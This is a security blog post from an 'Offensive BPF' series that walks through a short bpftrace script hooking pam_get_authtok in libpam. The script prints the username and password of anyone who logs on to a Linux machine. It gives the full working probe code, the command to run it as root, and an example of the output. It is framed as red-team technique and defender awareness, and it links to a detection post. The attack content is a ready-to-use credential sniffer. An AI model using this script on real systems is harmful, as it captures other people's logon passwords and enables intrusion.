---
title: "Offensive BPF: Using bpftrace to sniff PAM logon passwords"
date: 2022-07-10T20:00:13-07:00
draft: true
tags: [
        "pentest", "red","research","ebpf"
    ]

twitter:
  card: "summary_large_image"
  site: "@wunderwuzzi23"
  creator: "@wunderwuzzi23"
  title: "Offensive BPF: Using bpftrace to sniff PAM logon passwords"
  description:  "Using eBPF in offensive security settings and mitigations"
  image: "https://embracethered.com/blog/images/2021/obpf.png"

---

This post is part of a series about **Offensive BPF**. Click the ["ebpf"](/blog/tags/ebpf) tag to see all related posts.

![Offensive BPF](/blog/images/2021/offensive-bpf.png)

It has been a while that we posted something in the ["Offensive BPF"](/blog/tags/ebpf) series. But recently there have been a couple of new cool ebpf based tools, such as [TripleCross](https://github.com/h3xduck/TripleCross), [boopkit](https://github.com/kris-nova/boopkit) and [pamspy](https://github.com/citronneur/pamspy). 

So, I thought it be quite fitting to do another post in the Offensive BPF series to keep raising awareness.


# Let's sniff PAM again - pamsnoop.bt

A few weeks back we discussed a [backdoor PAM module](/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/) to grab `authtok` tokens (e.g. SSH passwords) when someone logs on to a machine. In this post we will build an eBPF program using `bpftrace` to do the same. Kudos for the idea go to [citronneur](https://github.com/citronneur/pamspy).


The short `bpftrace` script we are discussing is [here](https://github.com/wunderwuzzi23/Offensive-BPF/blob/main/bpftrace/pamsnoop.bt).

Let's walk through the details.

## Declaring the stub pam_handle struct

The  first step is to make sure we have the right data structure available. `pam_private.h` is [the header file](https://github.com/linux-pam/linux-pam/blob/master/libpam/pam_private.h) in the Linux source. 

Technically you can  include the header file directly, but it might not be available if you trying to "live off the land" during a Red Team exercise. The `filler` is a bit of a hack, but it works quite well.

```
struct partial_pam_handle {
      char *filler[6];
      char *user;
};
```

Next, we create a `BEGIN` section to just show some information on the Console

```
BEGIN 
{ 
      printf("Welcome to Offensive BPF. Sniffing PAM authentications...");
      printf("Ctrl-C to exit.\n\n");
}
```

Now we create the core of the bpftrace program by hooking the `pam_getauthtok` call, reading the username and the password into a variable and printing them out once the function returns. 

```
uprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok {
      @user[tid] = ((struct partial_pam_handle *)arg0)->user;
      @authtok[tid] =  arg2;
}
    
uretprobe:/lib/x86_64-linux-gnu/libpam.so.0:pam_get_authtok /@user[tid]/ {
  
      printf("Program: %s, Username: %s, AuthTok: %s\n", 
             comm, //process
             str(@user[tid]),  
             str(*@authtok[tid])); 
             
      delete(@user[tid]);
      delete(@authtok[tid]);
}
```

**Important:** If you have trouble understanding why there is a `uprobe` and a `uretprobe` go back in the ["Offensive BPF Series"](/blog/tags/ebpf) and to read up on how bpf programs are structured. 

Also, recall that `/ @user[tid] /` is the syntax to apply a filter.

## Running pamsnoop.bt

Run the script with `sudo bpftrace pamsnoop.bt`.

```
hacker@commodore:~$ sudo bpftrace tracepam.bt 
Attaching 3 probes...
Welcome to Offensive BPF. Sniffing PAM authentications...Ctrl-C to exit.

```

Now, whenever someone logs on to the machine you will see username and authentication token:

![pamsnoop](/blog/images/2022/ebpf.pam.png)

Quite useful when running across infrastructure that has `bpftrace` already installed.


# Conclusion

In this post we looked at more advanced `bpftrace` usage scenarios that adversaries can leverage and that defenders not to start being aware of. 

As a reminder, there is a defender/detection post we did in the past, located [here](/posts/2021/offensive-bpf-detections-initial-ideas/).


Cheers.


# References

* [pam_private header file](https://github.com/linux-pam/linux-pam/blob/master/libpam/pam_private.h)
* [TripleCross](https://github.com/h3xduck/TripleCross) 
* [boopkit](https://github.com/kris-nova/boopkit) 
* [pamspy](https://github.com/citronneur/pamspy)
* [Offensive BPF Detection Ideas](/posts/2021/offensive-bpf-detections-initial-ideas/)

